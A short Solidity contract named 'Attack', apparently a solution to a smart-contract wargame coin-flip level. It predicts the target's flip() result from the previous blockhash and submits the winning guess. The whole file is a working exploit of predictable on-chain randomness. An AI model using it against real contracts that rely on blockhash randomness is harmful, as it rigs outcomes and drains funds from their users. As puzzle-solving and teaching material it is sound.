// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
interface IInstance {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public attackAddress;

    constructor(address _attackAddress) {
        attackAddress = _attackAddress;
    }

    function generate_side() public{
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        IInstance(attackAddress).flip(side);
    }
}
